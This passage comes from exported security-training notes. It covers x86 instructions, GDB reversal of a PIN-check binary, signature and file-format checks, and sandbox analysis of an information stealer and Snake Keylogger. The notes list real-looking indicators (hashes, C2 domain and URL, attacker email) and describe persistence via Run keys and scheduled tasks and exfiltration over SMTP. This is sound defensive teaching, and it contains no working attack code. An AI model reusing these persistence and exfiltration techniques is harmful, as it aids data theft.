register.\nLEA\nThe “LEA” is the instruction used to assign a memory address to the target. It stands for “LEA: Load Effective Address”. For example:\n`LEA    ECX, [esp+0x4]\nWith the above instruction, the memory address is assigned to the ECX register.\nXCHG\nThe “XCHG” instruction allows to exchange values in 2 registers. For example:\n\nEAX = 0x2\nEBX = 0x3\n\nLet the register values be as above.\n`XCHG    EAX, EBX\nAfter the above instruction is executed, the updated values of the registers are as follows:\n\nEAX = 0x3\nEBX = 0x2\n\nPUSH\nThe “PUSH” is the instruction that allows adding data to the stack. For example:\n`PUSH    EDX\n\nAs seen in the image above, the value in the EDX register has been successfully added to the stack with the “PUSH” instruction.\nPOP\nThe “POP” is the instruction that extracts data from the stack. For example:\n`POP    EDX\n\nAs seen in the image above, the data at the top of the stack has been removed from the stack using the “POP” instruction and assigned to the EDX register successfully.\nLogical Instructions\nAssembly language has many instructions that are used for logical operations. Some of these instructions are described below:\nAND\nThe “AND” is the instruction that enables to implement the logical AND operation. For example:\n`AND    ESP, 0xfffffff0\nWith the above instruction, the fixed value and the ESP register are ANDed.\nOR\nThe “OR” is the instruction that enables to implement the logical OR operation. For example:\n`OR    EAX, 0xfffffff0\nWith the above command, the fixed value and the EAX register are ORed.\nXOR\nThe “XOR” is the instruction that enables to execute the logical XOR (exclusive OR) operation. For example:\n`XOR    EBP, EBP\nWith the above instruction, the EBP register is XORed with itself.\nNOT\nThe “NOT” is the instruction that enables to implement the bitwise inversion operation. For example:\nEAX = 0x626c7565 (Hexadecimal)\nLet the EAX register have the above value.\n0x626c7565 ⇒ Binary ⇒ 01100010 01101100 01110101 01100101\n`NOT    EAX\nNew EAX Value = 10011101100100111000101010011010 (Binary)\nNew EAX Value = 0x9d938a9a (Hexadecimal)\nWith the above instruction, the bitwise NOT operation has been executed successfully and with that, the EAX register has a new value.\nNOP Instruction\nThe “NOP” instruction means “no operation” that allows to move on to the next instruction without any operation being executed. It is used alone without the operand.\nNote: More instructions for X86 Assembly architecture can be found at:\nX86 Assembly Instructions: www.aldeid.com/wiki/X86-assembly/Instructions\nX86 Assembly Instructions(Wikipedia): en.wikipedia.org/wiki/X86_instruction_listings#Original_8086/8088_instructions \nWhat is Opcode(Operation Code)?\nOpcode(Operation Code) is a unique value that belongs to each instruction. Thanks to this value, the machine understands which instruction to execute. The following image shows the opcodes of the instructions according to the x86 architecture:\n\nOpcodes are usually expressed in hexadecimal notation. For example, let’s see the opcode of the “NOP” instruction according to the image above:\n\nAfter finding the “NOP” instruction on the image, we should first look at its equivalent on the left lines: “9”, then, check the column equivalent at the top: “0”. The combination of these hexadecimal values creates the opcode: “0x90”.\nNOP Instruction Opcode: 0x90"},"Malware-Analysis/Debugging-with-GDB":{"slug":"Malware-Analysis/Debugging-with-GDB","filePath":"Malware Analysis/Debugging with GDB.md","title":"Debugging with GDB","links":[],"tags":[],"content":"Example of Debugging with GDB\nIn this part of the training, reverse engineering studies will be carried out on a Linux executable file written in C programming language. During these studies, GDB debugger tool will be used mainly. In addition, some tools will be used as auxiliary to GDB.\nBefore starting the reverse engineering process, it is necessary to obtain some information about the executable file to be analyzed. Obtaining information such as which operating system the executable file was compiled for, the type of the file, which programming language it was written in, and whether anti-reversing techniques were applied or not will allow the methods and tools to be used in the reverse engineering process to be selected more accurately. The executable file to be used in the example is the file named “pincode” as you can see in the image below.\n\nLet’s start collecting information about the file by opening the command line in the directory where the file is located, and then we can start the reverse engineering processes.\nThe “file” command is what you can use to get information about files. With the “file” command, you can get variety of information about the file such as its type, etc. Let’s see the “file” command output of the file:\nCommand: `file pincode\n\nAs seen in the image above, the file command output indicates that the file named “pincode” is an “ELF 32-bit” type file. The ELF file type is the type of executable files in Linux. In this section, there is no information about which programming language was used while writing the program. Programming language knowledge will be vital when applying reverse engineering techniques and understanding the code written. Therefore, we need to utilize another tool to determine which programming language is used for this file.\nAnother tool that can be used on each file in the Linux command line is the “strings” tool. The Strings is a very useful tool used to obtain information about files and will help display all the values in the string type in the file. Let’s examine the results by applying the Strings tool on the pincode file:\nCommand: `strings pincode\n\nNote: The output of the Strings command can sometimes be very long. Therefore, it is possible to examine it easier with commands such as “more” that can be applied on the command line in Linux.\nLooking at the “strings” output, some of which can be seen in the image above, we see some familiar function names belonging to the language used as the programming language. In addition, there are some expressions in the program as strings. Some of the information contained in the “strings” output can be very important.\nFor example, a password information used in the program can be included in this output, or if the file is malicious, the IP address of the command and control(C2) server can be included in this section. Knowing all this useful information, let’s continue to examine the “strings” output:\n\nFile extensions in strings can sometimes give us helpful tips. For example, in the image above, we see file names with the extension “.c”, which are the extensions of source code files belonging to more than one C programming language. In this way, we can say that the program is written in the C programming language.\nHaving obtained all this information, let’s run the program and observe its actions and behaviors:\n\nAs seen in the image above, a 4-digit PIN code is requested from the user after the program is run and feedback related to whether the entered PIN code is correct or not is provided back to the user. So far, we were able to obtain some information about the executable without seeing the assembly code with the help of some tools and techniques. It is necessary to examine the codes at the assembly level in order to find out what the correct 4-digit PIN code is in the program. Before examining the executable file dynamically with GDB to find the PIN code, we can see the assembly codes of the functions through the disassembling process, which is a static process. We have used the “objdump” tool here but we could have utilized the GDB as well to get the same results.\nCommand: `sudo objdump -d pincode -M intel\n\nThe above image shows the instructions in the program flow in the “main” function.\nLet’s start debugging via the GDB tool:\n\nAs seen in the image above, the gdb tool started and the “pincode” executable file was imported into gdb. Looking at the list of functions, we can see the function to be debugged with the name “main”.\nLet’s set a breakpoint in the main function with the “b main” command and run the file with the “run” command:\n\nSince the value we want to find in the program flow is the PIN code, we must find the assembly instruction with the comparison in the verification part. For this, we can use the processes we know that are in the program flow as a reference.\nFor example, there are some string values that are printed on the command line and we the user input is received as well. We will have to move forward the program flow as the PIN code comparison comes later than these operations. Let’s advance the program flow to the desired section by executing the “ni” command as required:\n\nAs seen in the image above, the “printf” function which was used for command line printing process was detected. Let’s find the part that we received the user input by advancing the program flow with the “ni” command:\n\nAs seen in the image above, the “scanf” function, which received input from the user, was detected. When we advance the program flow, an input will be received from the user:\n\nAs seen in the image above, input has been received from the user with the “scanf” function. Let’s continue by typing any value in the form of “1111”.\n\nAs we see in the screenshot above, we are at the part where the comparison process is made. The instruction used for the comparison operation is the “CMP” instruction. In the red area above, the input value entered by the user is assigned to the EAX register with the MOV instruction. Next, CMP instruction compares the fixed value which is the correct PIN code and the input entered by the user assigned to the EAX register.\n\nAs seen in the image above, the hexadecimal value of “0x457” was assigned to the EAX register by executing an instruction with the “ni” command. The decimal equivalent of this hexadecimal value is “1111”. The hexadecimal value “0x1b96”, which is the operand of the “CMP” instruction, is the correct PIN code we are looking for and the decimal equivalent of its value is “7062”. We think that the value “7062” we found here in this section is the correct PIN code, but is the value we found really correct? The simplest way to find that out is to run the file and try this value.\n\nAs seen in the image above, the detected PIN code was verified. There is no need to continue further investigation on GDB as we have the answer we are looking for. If we were to continue to investigate, we would reach the section with the string displayed on the screen and then see the assembly codes where the program was terminated."},"Malware-Analysis/Digital-Signature-Analysis":{"slug":"Malware-Analysis/Digital-Signature-Analysis","filePath":"Malware Analysis/Digital Signature Analysis.md","title":"Digital Signature Analysis","links":[],"tags":[],"content":"What is Digital Signature?\nDigital signature is a signature that indicates which vendor has created the executable file. This signature helps distinguish counterfeit executable files from the original ones.\nNote: The topic of what digital signatures mean cryptographically is beyond the scope of this training.\nSignificance of Digital Signatures in Static Malware Analysis\nIn static malware analysis, digital signatures are used to verify that executable files are not malware. Usually, malware does not have a digital signature.  The fact that an executable file is signed by a known vendor often indicates that it is not malware. However, the fact that an executable file has a real signature does not give any accurate information about whether it is malware as the developer can also sign the file. The first thing to consider here is that a valid signature from a known vendor should be present on the file. In some cases, even if the executable file is signed with a valid signature of a known vendor, it may be malware. For example, with “Supply Chain Attacks”, the attacker can use the valid signature of the vendor and release the file as malware. In this case, the malware should be analyzed to determine whether there are behavioral anomalies. If an invalid signature of a known vendor is present on the file, this also indicates a suspicious situation for malware. This is because sometimes vendors’ digital certificates can fall into the hands of malware developers, and they can sign files using the vendor’s now invalid digital certificate (Revoked Certificate) to make their executables appear secure.\nHow to Analyze Digital Signatures on Windows Executable\nThe built-in features of the Windows operating system can be used to view the digital signatures of Windows executable files. For instance, let’s see the digital signature of an executable file:\n\nAs in the image above, the properties menu of the file can be opened by right-clicking on it.\n\nAs seen in the image above, it has been successfully proved that the digital signature belongs to Google.\n\nDetails of the signature can be viewed with the “Details” button as demonstrated in the above image:\n\nThe validity and security of this digital certificate can be checked on VirusTotal. The file is uploaded to VirusTotal and the analysis is initiated. After the analysis is completed, the “Details” tab is accessed:\n\nAs seen in the image above, the verification process of the digital signature of the Windows executable file is successfully performed, and it is determined that the file has a valid signature."},"Malware-Analysis/Dynamic-Analysis-Steps":{"slug":"Malware-Analysis/Dynamic-Analysis-Steps","filePath":"Malware Analysis/Dynamic Analysis Steps.md","title":"Dynamic Analysis Steps","links":[],"tags":[],"content":"Process Activities\nWhen the malware is run, it creates a process of its own like other applications. All operations on the operating system are carried out through a process. Before following other activities, we must detect the processes belonging to the malware.\nA large number of process, network, registry and file activities take place within the operating system. Since it may not be possible to analyze all these activities, we can start analyzing the activities of the malware processes to see if we can find anything solid about its activities.\nWhen examining a process, special attention should be paid to information such as whether it creates a new child process, the DLLs it imports, and which user it is run by.\nYou can use an application called Process Hacker to examine processes.\n\nProcess Hacker makes it easy to examine processes by listing processes in a hierarchical view. When the malware creates a new process, you can see the newly created process under its parent process.\nMalware can inject itself into different processes, perform activities for its own purposes with living of the land binaries, or make legitimate applications run their own applications. For these reasons, the activities of all processes belonging to the malware and used by the malware should be analyzed.\nFor instance, let’s say the malware injects itself into the notepad.exe process after it runs. In this case, we need to examine all of the activities that notepad.exe has created since the moment it was injected.\nTopics like Process Injection will be discussed in the malware analysis trainings.\nNetwork Activities\nMalware often establish a network connection to download the second payload, to communicate with command and control (c2), to jump to other devices in the network, to steal data.\nAt the end of our malware analysis we need to detect these network connections, learn how the malware communicates, and report these network activities.\nWireshark is a software that can meet all your needs for analyzing network activities. However, you may choose tools such as Fiddler, in cases where you know that the malware communicates especially over the HTTP protocol (Malware mostly communicates via protocols such as HTTP, SMTP).\nRegistry Activities\nWe mentioned Registries in the Windows tutorial. Quickly again, registries are hierarchical databases that are used for data storage in Windows operating systems. It is used by attackers for purposes such as stealing data and ensuring persistence.\nWindows keeps applications to run when the operating system is started in some registry keys. Attackers aim to ensure persistence by taking the advantage of this feature of the operating system, and adding their own malicious software to these registry keys.\nSome of these registry keys;\n\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nSince Registries are also used a lot by normal processes, you, specifically need to look at the registry changes made by malicious software processes.\nBy using the application called Regshot, you can detect the changes that the malware has made on the Registries.\n\nBefore executing the malware, you can run Regshot and click the “1st shot” button to let Regshot collect existing registries.\nThen, you should press the “2nd shot” button to get a new shot after running the malware and allowing some time to show activity. You can see the differences between these two shots of Regshot by pressing the “Compare” button.\n\nFile Activities\nMalware performs file activities on the operating system for many reasons. Recently, attackers have developed fileless malware to prevent detection.\nOn Windows, there is a directory called “Temp” where temporary files are located. Applications usually use this directory to host their volatile files. Malware often copies itself to the Temp directory. For this reason, you should pay special attention to the activities performed on this directory.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\n%TEMP%\n\n\nIn order to ensure persistence, malware also copies itself to the Startup directory, which contains applications that will run automatically when the operating system starts. You should pay special attention to the activities performed in these directories.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\nshell:startup\nshell:common startup\n\n\n\n"},"Malware-Analysis/Dynamic-Email-Analysis":{"slug":"Malware-Analysis/Dynamic-Email-Analysis","filePath":"Malware Analysis/Dynamic Email Analysis.md","title":"Dynamic Email Analysis","links":["SOC/SOC-Analyst-Notes/Phishing"],"tags":[],"content":"URLs and files in an email need to be checked to make sure they are safe. The websites and files in the mail should be run in sandbox environments and the changes made to the system should be examined to see if they are harmful or not and in no circumstance should they be run in local host in our network.\nTools\nBrowserling\n\nYou can use online web browsers such as Browserling to quickly check the web addresses in the email. The advantage of such services is that you are not burdened by a possible zero-day vulnerability that would impact browsers, as you are not visiting the website on your own computer. On the other hand, the disadvantage of using web browsers such as Browserling is that if the malicious file is downloaded from the website, you will not be able to run it. This could interrupt your analysis.\n\nBefore going to the links in the email, you should check if there is any important information in the URL. If we examine the example in the image above, and the user’s email address in the email parameter. So even if the user does not enter their password on the Phishing page, when they click on popularshoppingsite[.]com and visit the website, the attacker will know that this user is valid. The attacker can increase the success rate of the attack by social engineering the valid users in later attacks. Therefore, it is important to change information such as email addresses before accessing websites.\n\nSandbox Environments\nSandbox environments allow you to examine suspicious files and websites without the risk of infecting your computer with malware. Many sandbox services/products are available for both paid and free use. You can choose one or more of these services according to your needs.\nSome commonly used sandboxes:\n\nVMRay\nCuckoo Sandbox \nJoeSandbox\nAnyRun\nHybrid Analysis(Falcon Sandbox)\n\nSome petty tricks\nMalware can wait a certain amount of time without taking any action to make detection more difficult. You have to wait for the malware to take action before you decide that the file being scanned is not malicious.\nAlso, the fact that there are no URLs and files in the email does not mean that it is not malicious. The attacker may also send the malware as an image to avoid detection by the analysis tools."},"Malware-Analysis/Dynamic-Malware-Analysis-Example-1":{"slug":"Malware-Analysis/Dynamic-Malware-Analysis-Example-1","filePath":"Malware Analysis/Dynamic Malware Analysis Example 1.md","title":"Dynamic Malware Analysis Example 1","links":[],"tags":[],"content":"File Name: e-Archive Dekont.exe\nMD5 Hash: 7a0093c743fc33a5e111f2fec269f79b\nSHA256 Hash: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nYou can use Wireshark and Fiddler to see network activities. Fiddler will suffice, as the malware we reviewed communicates over the HTTP protocol.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nAs we mentioned earlier in our training series, there are some advantages of detecting process activities first. Since we will encounter a lot of logs and activities, the first step we need to do is to detect the processes belonging to the malware.\nWhen we examine the processes occurred over Process Hacker, we see that only one process belonging to the malware is running.\n\nHowever, things are not always as they seem! Since Process Hacker only shows the processes that are running momentarily, the malware may have created a child process at a time we did not monitor and terminated it later.\nAt this point, the Procmon tool comes to our rescue. If you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nThe process tree provided by Procmon completes this shortcoming of Process Hacker, as it also includes terminated processes.\n\nWhen we go over the the image above, we see that the first process we run (9076 PID) runs the tool called “schtasks.exe” belonging to Windows Task Scheduler (PID 4800) and then runs its own malware (7944 PID) again.\nBefore moving on to other activities, let’s examine the schtasks.exe process. Schtasks.exe is a tool that enables the Task Scheduler to be used via the command interface in the Windows operating system. Attackers ensure persistency by adding their own malware to scheduled tasks with the help of Task Scheduler.\nIn order to see what kind of scheduled task the attacker added, we must click on the “schtasks.exe” (4800 PID) in the process tree of procmon and examine its details.\n\nWhen we examine the command-line arguments, we see that a scheduled task named “Updates\\VbxFiQYCyFDgGL” has been created. However, the information of the scheduled task except for its name is in the XML file located at the following path:\n“C:\\Users\\Amanda\\AppData\\Local\\Temp\\tmpCCF2.tmp”.\nClick here to get information about the command-line arguments of the tool named Schtasks.exe.\nWhen you try to access the relevant file, you can see that the file is deleted. But don’t worry, this scheduled task is now saved so we can see it through the Scheduler Task.\n\nOn the Trigger tab, you can see in which situations this scheduled task added by the attacker will run. As it can be seen on the screenshot above this scheduled task will run at log on.\n\nYou can see what action will run on the Actions tab. You can see on the above screenshot that the malicious software named “VbxFiQYCyFDgGL.exe” prepared by the attacker will run when this scheduled task runs.\nThis is how we have detected the scheduled task that the attacker added.\nWe detected malware processes (9076, 4800, 7944 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou filter down the processes with PID values of 9076, 4800, 7944 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nSince the malware we examined communicates over the HTTP protocol, you can detect the connections it establishes very easily using the Fiddler tool.\nAfter running the malware, you can see that the process named “e-archive dekont.exe” on Fiddler communicates with the domain “5gw4d[.]xyz”.\n\nRegistry Activities\nWhen we examine the registry activities, you can see that the keys under HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrrentVersion\\Uninstall are queried. There are settings under this key that are left by the applications installed in the system for uninstall. It is often preferred to enumerate this key to detect applications installed on the system by attackers.\n\nFile Activities\nTo detect malware file activities, disable the other three activities in the top menu of procmon.\n\nYou can enter a filter with Operation=CreateFile to see file creation activities.\nWhen we examine the logs, we see that an executable file named “VbxFiQYCyFDgGL.exe” is written under the “C:\\Users\\Amanda\\AppData\\Roaming” directory.\n\nWhen we look at the hash of the application named “VbxFiQYCyFDgGL.exe” with the tool called HashMyFiles, we see that it is actually the same file as the file we analyzed first. We see that the malware has copied itself to a different folder.\n\nWhen we examine the file activities further, we see that the malware reads the files to steal information from applications such as Firefox, Chome, Thunderbird. We have determined that the malware we have is information stealer.\n\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nthe malware has copied itself to the “C:\\Users\\Username\\AppData\\Roaming” directory with the name “VbxFiQYCyFDgGL.exe”,\nhas used Task Scheduler to ensure persistence,\nhas enabled its own malicious application to run at every logon by creating a scheduled task with the name “VbxFiQYCyFDgGL” \ncommunicates with the command &amp; control server,\nthe command control address is “5gw4d[.]xyz/PL341/index.php” and it communicates over the HTTP protocol,\ndiscovers the applications installed in the system with the help of the key under the “HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall” registry key,\nsteals sensitive data from applications such as Chrome, Firefox, Thunderbird.\n\nArtifacts\nMD5: 7a0093c743fc33a5e111f2fec269f79b\nSHA256: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nFile Name: e-Archive Dekont.exe\nFile Name: VbxFiQYCyFDgGL.exe\nDomain: 5gw4d[.]xyz\nURL: http[:]//5gw4d[.]xyz/PL341/index.php"},"Malware-Analysis/Dynamic-Malware-Analysis-Example-2":{"slug":"Malware-Analysis/Dynamic-Malware-Analysis-Example-2","filePath":"Malware Analysis/Dynamic Malware Analysis Example 2.md","title":"Dynamic Malware Analysis Example 2","links":[],"tags":[],"content":"File Name: Sales Order Sheet.pdf.exe\nMD5 Hash: 411019bcb582ef6e3dab080d99925b4b\nSHA256 Hash: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nOpen the Wireshark application to see network activities.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nWhen we examine the running processes using Process Hacker, we see that only 1 process belonging to the malware is running.\n\nLike in our previous example, the malware may have created a different process, but we may not be able to see it because it is not running instantly. Let’s confirm this behavior using the procmon tool.\nIf you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nAs we can see in the image above, we see that the first process we run (8780 PID) has a child process (7100 PID) named “regsvcs.exe”.\nRegsvcs.exe is a tool called .NET Service Installation Utility, which is installed by default in Windows operating systems by Microsoft.\nAttackers often name applications that come by default in the operating system to avoid detection. We have to determine whether the malware we are examining is really the legitimate application that comes by default in Windows or it is how the attacker named his own software to prevent detection.\n\nWhen we examine the path information of the process, we see that the actual directory where the RegSvcs.exe tool, which comes by default in the Windows operating system appears. But, we still need to do a hash check to verify this.\nLet’s get the hash of “C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe” with the help of the tool named HashMyFile.\n\nWhen we search the hash on VirusTotal, we see the the information that states the relevant application has been published by Microsoft.\n\nWe have determined that the running application is indeed an application published by Microsoft. So does this mean the app is safe?\nAttackers can inject malicious code into legitimate applications by using techniques such as Code Injection, Process Hollowing, Reflective DLL Injection that allow these applications to run the malicious codes. In addition, there are binaries that are called “living of the land binary” and that allow malicious activities to be carried out without injecting malicious code.\nWe can assume that our malware creates this process to perform a malicious activity since it’s created by malware. However, we must always support our assumptions with valid evidence. The next time when we examine network, registry activities, we will prove that this process is indeed used for malicious purposes.\nWe detected malware processes (8780, 7100 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou can filter down processes with PID values ​​of 8780, 7100 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nBefore performing our analysis on Wireshark, let’s check to see if the malware makes any web requests, as it can be examined more easily.\nWhen we look at the Fiddler application, we see that there is a web request made by the malware (regsvcs.exe, 7100 PID).\n\nWhen we examine the web request, we see that the malware makes a request to checkip.dyndns.org in order to find the public IP address. Attackers often use IP address learning services to perform targeted attacks or learn the victim’s IP address. This behavior may be considered commonplace for malware.\nDid you notice the name of the process making the web request? “Regsvcs.exe” should not throw such a request in normal use.\nWhen we examine the network activities over Wireshark, we see that there is SMTP traffic. SMTP is the protocol used for sending email. Since we didn’t send email, we can say that this is a very suspicious traffic.\n\nYou can clearly see all SMTP traffic by right-clicking on any SMTP packet and clicking “Follow” then “TCP Stream”.\n\nIf we examine the SMTP traffic, we find that the malware connects to skychine[.]com[.]my’s mail server and sends email to graceunlimited153@gmail[.]com with “Pc Name: admin | Snake Keylogger”.\n\nWhen we look at the content of the mail, we see that there are multiple attachments with names such as “Password.txt”, “User.txt”. In order to bring the contents to readable format, we have to base64 decoding.\n\nAs you can see from the subject title and email content, the malware we analyzed is actually Snake Keylogger.\nWhen we look at the e-mail content, we can see that the malware sends the user name, password information of the web applications and the IP address of the device.\nAttackers often send the information they have obtained to their own email addresses using SMTP servers that they have previously seized. In other words, the skychine[.]com[.]my domain name is actually an SMTP server that is not malicious but is hijacked by the attacker and used for malicious purposes. However, since the email sent was sent to the attacker’s email address, the graceunlimited153@gmail.com address most likely belongs to the attacker.\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nIt’s Snake Keylogger\nSteals credentials from browsers\nChecks IP address\nExfiltrates data via SMTP\nConnects skyshine.com[.]my:25\n\nArtifacts\nMD5: 411019bcb582ef6e3dab080d99925b4b\nSHA256: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nFile Name: Sales Order Sheet.pdf.exe\nDomain: checkip.dyndns.org\nDomain: skyshine[.]com[.]my"},"Malware-Analysis/File-format-analysis":{"slug":"Malware-Analysis/File-format-analysis","filePath":"Malware Analysis/File format analysis.md","title":"File format analysis","links":[],"tags":[],"content":"What is File Format?\nFiles have their own unique structure. Each different file type has a different number and length of fields. In order for programs to interpret and extract meaningful information from files, a specific file structure known as the “File Format” is essential. Operating systems require knowledge of this file format to read files correctly. Without understanding the file format, the operating system cannot accurately parse the file’s fields or comprehend the data contained within it. For instance, Windows executable files with the “.exe” extension cannot be directly executed on Linux. Additional tools that can parse the file format are needed to run them.\nSignificance of File Format in Static Malware Analysis\nIn static malware analysis, understanding the file format of the malware is crucial. The file format provides valuable information about which operating system the malware is aimed at and/or which software can be used to run the malware. For example, when a malware with “.exe” extension is encountered, it indicates that the malware is designed for the Windows operating system. Similarly, when a malware with “.docx” extension is seen, it indicates that the malware aims to infect the system or perform malicious activities using office programs. In static malware analysis, determining the file format is vital as analysis methods and tools may vary depending on the format. Additionally, each file format has its distinct characteristics which means that the attack vectors may also vary. For instance, thanks to the macro feature in office files with “.docx” extension, malware can be embedded in the file with “VisualBasic”. When the macro is executed, the malware runs.\nSimilarly, malicious “JavaScript” codes can be embedded in PDF files.\nFile Header\nWhen determining the format of a file, the part to examine is the file header. This is because the file header differs for each file type. The “magic bytes” field in the file header is a field that consists of the initial few bytes of the file and provides insights into the file type. In other words, magic bytes is the signature of the file.\nFor access to the signatures and extensions of numerous file types, you can visit the following address:\nList of File Signatures: en.wikipedia.org/wiki/List_of_file_signatures \n“Hex Editor” tools can be utilized to examine the file header and magic bytes fields. For example, the image below demonstrates the file headers of Windows executable (PE file) files.\n\nThe following address can be used to examine the images showing the headers of files with different file formats: \nFile Formats: github.com/corkami/pics/blob/master/binary/README.md \nFile Extensions\nA file extension is an appendage added to the end of the file name that gives information about the format of the file. Typically, each different file type has its own extension. For example, “.html” is the extension for web pages that contain HTML code. Below are statistics on the file extensions most commonly used by malware in 2020:\n\nFile Type and File Extension Mismatch\nTypically, the file extension provides accurate information about the file format. However, in certain cases, attackers can deceive their targets by disguising the extension and successfully execute their attacks. For instance, the file in the image below appears to be a “PDF” file looking at its extension.\n\nHowever, the “File name extensions” option on Windows must be activated to find out if this is really a PDF file.\n\nAs can be seen in the image above, it cannot be definitively concluded that the file is a PDF file since the option to display file extensions is not enabled. Upon enabling this feature, let’s see the file extension:\n\nThe image above shows that the actual extension of the file is “.exe”.\nFile Thumbnail Faking\nIn addition to the method described in the previous topic, attackers may also modify the thumbnail image associated with the file to enhance the effectiveness of their attack. By doing so, they not only conceal the actual file extension but also prevent the user from learning the real file format. For instance, in the previous example, the thumbnail of the file reveals that it is not a PDF file but instead a Windows executable file.\n\nHowever, when viewing the file as shown in the image above, it is easy to initially mistake it for a PDF file.\n\nUpon enabling the option to display file extensions, it becomes evident that the file in question is not a PDF file, but rather a file with the “.exe” extension. \nHow to Identify File Type Automatically?\nIn some cases, it may be necessary to find out the file type with the help of a tool. When a large number of files need to be analyzed in a short time, for instance, it may be necessary to use tools that automatically detect the file type to save time.\nFile Type Identification with DROID Tool\nThe “DROID” tool, which runs on the Windows operating system and has a graphical user interface (GUI), is one of the tools used to detect file types. You can access the DROID tool from the address below:\nDROID: www.nationalarchives.gov.uk/information-management/manage-information/preserving-digital-records/droid/ \nWhen the DROID tool is initially launched, a tab similar to the one depicted below is displayed:\n\nThe files to be analyzed are provided to the tool via the “Add” button.\n\nOnce the files are added, the process is initiated and the results are seen by clicking the “Start” button.\n\nAs demonstrated in the image above, the file format information of files is successfully obtained.\nFile Type Identification with Online Web Services\nIn static malware analysis, it is possible to use online web services to determine the file type of the malware. By uploading the file of the malware to online web services, the file type can be learned.\nNote: When detecting malware file types using online services, it should be considered that the file is uploaded to the target website. If sharing the file with the target web address poses a critical and inconvenient situation, performing the analysis in isolated sandbox environments using offline tools is recommended.\nFor example, a file type detection is performed using the online web address “checkfiletype.com” below:\n\nThere are numerous web addresses used for identifying the file type. Some of these addresses are listed below:\n\n\nwww.detectfiletype.com/ \n\n\nfilext.com/ \n\n\nfiletypechecker.com/ \n\n\nwww.sisik.eu/file  \n\n\nwww.aconvert.com/analyze.html \n\n\nwww.checkfiletype.com/ \n\n\nwww.toolsley.com/file.html \n\n\nHow to Identify File Type Manually?\nIn static malware analysis, file type detection can typically be accomplished using tools or simple methods. However, for custom file types and/or files with damaged file headers, manual examination may be required. In such situations, the file’s signature can be identified, and the file type can be determined with the assistance of hex editor tools.\nYou can access the hex editor tool named “HxD” seen in the image below from the following address:\nHxD: mh-nexus.de/en/hxd/ \nFor example, the signature of a Windows executable file is shown below on the hex editor:\n\nAs observed in the provided image, the file’s signature was detected using the hex editor, leading to the identification of the file as a Windows executable."},"Malware-Analysis/GNU-Debugger-(GDB)":{"slug":"Malware-Analysis/GNU-Debugger-(GDB)","filePath":"Malware Analysis/GNU Debugger (GDB).md","title":"GNU Debugger (GDB)","links":["Assets/5bb11b59a8e0c0c04ac38b451564a401_MD5.gif"],"tags":[],"content":"What is GDB?\nGNU Debugger (GDB) is a reverse engineering tool that enables debugging Linux executable files on the Linux command line.\nThe installation of GDB\nInstalling the GDB tool on Linux is quite simple. Since the “Debian” Linux distro is used in this training, the installation of the gdb tool is explained for Debian. The same command can be used for any Debian based Linux distro:\nCommand: `sudo apt-get install gdb\n\nAs seen in the image above, when the gdb installation command is applied, the gdb tool is installed by giving the answer “Y” to the question asked.\n\nAs seen in the image above, after the gdb tool installation is completed, the gdb tool can be 